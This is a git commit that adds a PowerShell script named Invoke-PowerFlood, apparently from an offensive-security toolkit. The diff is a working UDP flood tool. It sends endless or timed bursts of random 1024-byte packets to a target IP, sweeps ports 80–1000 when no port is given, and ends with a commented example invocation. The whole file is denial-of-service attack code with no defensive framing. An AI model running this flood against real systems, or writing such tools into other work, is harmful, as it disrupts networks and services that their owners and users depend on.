987c0f43a85e113d8ba6044492a82e6263158f4c
TheKevinWang <kwang2@g.clemson.edu>
2017-07-02 23:01:37 -0400

    Create Invoke-PowerFlood.ps1

---
+++ Invoke-PowerFlood.ps1
@@ -0,0 +1,66 @@
+<#
+UDP flood with PowerShell
+TODO: TCP flood
+#>     
+function Invoke-PowerFlood {
+ 
+    [CmdletBinding()] Param(
+     
+    [Parameter(Position=0)]
+    [String]$targetIP,
+    [Parameter(Position=1)]
+    $duration = 0,
+    [Parameter(Position=2)]
+    $port = -1
+ 
+    )
+ 
+    ## Check IP variable
+     function udpEngine {
+ 
+    [CmdletBinding()] Param(
+     
+    [Parameter(Position=0, Mandatory = $true)]
+    [String]$tIP,
+     
+    [Parameter(Position=1, Mandatory = $true)]
+    [String]$prt
+     
+    )
+     
+    $address = [system.net.IPAddress]::Parse( $tIP )  
+ 
+    # Create IP Endpoint   
+    $end = New-Object System.Net.IPEndPoint $address , $prt
+ 
+    # Create Socket   
+    $Saddrf    = [System.Net.Sockets.AddressFamily]::InterNetwork  
+    $Stype    = [System.Net.Sockets.SocketType]::Dgram  
+    $Ptype     = [System.Net.Sockets.ProtocolType]::UDP  
+    $Sock      = New-Object System.Net.Sockets.Socket $saddrf , $stype , $ptype  
+#    $Sock.TTL = 26
+    $StopWatch = New-Object -TypeName System.Diagnostics.Stopwatch
+    if ($duration -ne 0) {
+    $StopWatch.start()
+    }
+    while ($StopWatch.Elapsed.Seconds -lt $duration -Or $duration -eq 0) {  
+        $sock.Connect( $end )  
+        # Send random data of size 1024 bytes
+        $Enc = [System.Text.Encoding]::ASCII
+        $Message = New-Object Byte[] 1024
+        (New-Object Random).NextBytes($Message);
+        #$Buffer  = $Enc.GetBytes( $Message )  
+        # Send the buffer   
+        $Sent   = $Sock.Send( $Message )  
+     
+    }
+     
+}
+    if ($targetIP) {
+        # launch udp flood on range of ports if no port specified
+        if ($port -eq -1) {foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }} else
+        {udpEngine $targetIP $port}
+ 
+    } else { write-output "[!] target IP not specified, required!" }
+}
+#Invoke-PowerFlood 192.168.1.182 8 53
